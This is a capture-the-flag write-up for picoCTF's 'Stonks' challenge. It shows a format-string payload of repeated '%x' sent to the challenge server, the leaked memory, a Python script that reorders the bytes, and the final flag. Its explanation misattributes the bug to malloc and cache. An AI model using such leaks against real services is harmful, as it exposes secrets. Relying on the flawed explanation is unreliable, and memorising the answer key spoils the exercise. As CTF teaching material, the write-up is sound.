# Stonks

## Information

**Point Value**: 20 points  
**Category**: Binary Exploitation  
**Author**: MADSTACKS

## Description

I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](./vuln.c) nc mercury.picoctf.net 27912

## Hints

1. Okay, maybe I'd believe you if you find my API key.

## Solution

First things first, understand how the vuln.c code works, this will require some C knowledge.  
There you can find that the second input is using malloc(), knowing this, we can overload the memory and print out some things that are in cache.
Knowing this, access the netcat provided and use the first option. After that just spam a bunch of "%x"

```sh
$ %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
```

The program will print out some of the information stored, then it's pretty straightforward, get the output, that should look something like this:

```
ö;°H?ØÿÿÿñôÜpõö9_c°ocip{FTC0l_I4_t5m_ll0m_y_y3n2fc10a10ÿª}÷üjø÷ù@#=4÷âé÷ù À÷øµÀ÷ø°ÿªî÷á÷øµÀHì¯ú®é
```

Then take out the flag and rearrange it, I did it with Python, just for the sake of it.

```py
str = "ocip{FTC0l_I4_t5m_ll0m_y_y3n2fc10a10ÿª}÷üjø÷ù"
str = str[0:len(str)-len(str)%4]
result = ""
chunks = [str[i:i+4] for i in range(0, len(str), 4)]

for chunk in chunks:
    result += chunk[::-1]

print(result)
```

## Flag

picoCTF{I_l05t_4ll_my_m0n3y_1cf201a0}
